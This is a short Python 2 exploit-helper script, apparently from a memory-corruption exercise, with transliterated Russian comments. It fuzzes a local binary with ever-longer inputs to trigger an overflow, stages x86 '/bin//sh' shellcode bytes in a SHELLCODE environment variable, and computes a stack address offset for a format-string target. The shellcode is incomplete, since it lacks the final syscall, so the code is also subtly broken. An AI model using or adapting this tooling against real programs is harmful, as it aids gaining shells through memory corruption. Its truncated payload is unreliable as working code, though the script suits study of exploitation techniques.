import subprocess
import sys
import os


if __name__ == "__main__" :
    env = os.environ
    print "Help \n Prog.py -O NUMBER_MAX -- Overfloor tries \n Prog.py TEXT -- Use custom input \n Prog.py -- Create $SHELCODE to given string use as arg \n"
    if len(sys.argv)>1 and sys.argv[1] == "-O"  :
        env["SHELLCODE"] = 'X'
        for i in range(int(sys.argv[2])):
            # Zapusk sub processa
            a = subprocess.Popen(["./a.out", env["SHELLCODE"]],stdout=subprocess.PIPE)
            # yvelichevie ramera
            env["SHELLCODE"]+="X"
        print a.communicate()[0]
            
        exit()

    if len(sys.argv) >1:
        # Berem kastomnyu stroky i zapyskaem
        strng = sys.argv[1]
        a = subprocess.Popen(["./a.out", strng],stdout=subprocess.PIPE)

    else:
        # nastraevaemam sredy
        x = subprocess.Popen(["echo", "-e"  ,'"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"'],stdout=subprocess.PIPE)
        env["SHELLCODE"] = x.communicate()[0]
        print env["SHELLCODE"]
        
        # startyem
        a = subprocess.Popen(["./a.out", env["SHELLCODE"]],stdout=subprocess.PIPE)
    
    stdoutput = a.communicate()[0]
    res =  stdoutput.split()
    print( stdoutput)
    
    print ":02 x {}".format(hex((int("0X"+res[2][0:-1],16)) - (len("./vuln_fmt") - len("./pea")) * 2))
